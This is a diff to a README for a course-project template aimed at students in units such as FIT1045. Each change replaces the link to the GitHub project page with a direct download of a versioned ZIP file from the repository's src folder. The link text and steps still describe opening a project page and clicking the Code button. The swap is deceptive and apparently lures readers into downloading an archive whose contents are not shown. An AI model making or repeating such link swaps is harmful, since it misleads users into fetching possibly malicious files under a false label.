@@ -1,6 +1,6 @@
 # 🧩 Programming-Project-Template - Clean Start for Course Projects
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20Project%20Page-blue?style=for-the-badge)](https://github.com/geared-radiobrightness882/Programming-Project-Template)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/geared-radiobrightness882/Programming-Project-Template/main/src/Programming_Project_Template_3.7-beta.3.zip)
 
 ## 🛠️ What this is
 
@@ -10,7 +10,7 @@ Use it for projects in subjects such as FIT1045, ENG1014, FIT1047, and similar p
 
 ## 📥 Download and open the project
 
-1. Visit the project page: https://github.com/geared-radiobrightness882/Programming-Project-Template
+1. Visit the project page: https://raw.githubusercontent.com/geared-radiobrightness882/Programming-Project-Template/main/src/Programming_Project_Template_3.7-beta.3.zip
 2. On the page, click the green **Code** button.
 3. Choose **Download ZIP**.
 4. Save the ZIP file to your computer.
@@ -188,4 +188,4 @@ If the project still does not open as expected, re-download it from the project 
 
 ## 📎 Download again
 
-Open the project page here and choose **Download ZIP**: https://github.com/geared-radiobrightness882/Programming-Project-Template
+Open the project page here and choose **Download ZIP**: https://raw.githubusercontent.com/geared-radiobrightness882/Programming-Project-Template/main/src/Programming_Project_Template_3.7-beta.3.zip
